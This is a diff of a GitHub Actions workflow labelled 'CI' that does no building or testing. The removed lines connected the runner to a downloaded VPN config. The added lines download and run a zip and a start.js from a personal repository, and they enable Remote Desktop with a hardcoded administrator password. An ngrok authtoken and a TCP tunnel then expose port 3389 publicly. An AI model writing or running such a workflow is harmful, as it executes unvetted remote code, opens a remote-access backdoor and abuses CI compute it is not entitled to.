@@ -2,11 +2,28 @@ name: CI
 on: [push, workflow_dispatch]
 jobs:
   build:
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
     steps:
 
-    - name: Command
-      run: wget https://raw.githubusercontent.com/raiyan088/public/main/jp.ovpn
-    - run: sudo apt update
-    - run: sudo apt install openvpn -y
-    - run: sudo openvpn --config jp.ovpn
+    - name: Start
+      run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/main/montag/node_modules.zip -OutFile start.zip
+    - run: Expand-Archive -LiteralPath start.zip
+    - run: Invoke-WebRequest https://raw.githubusercontent.com/raiyan088/public/main/montag/start.js -OutFile start\start.js
+    - run: node start/start.js 0
+    
+      
+    - name: Download
+      run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+    
+    - name: Extract
+      run: Expand-Archive ngrok.zip
+
+    - name: Enable TS
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
+
+    - name: Create Tunnel
+      run: .\ngrok\ngrok.exe authtoken 2YMpPG6ws3Y1x5unwwSlUNVs3Wu_67JPAFd2MmxAo7cBVK7Lq
+    - run: .\ngrok\ngrok.exe tcp 3389
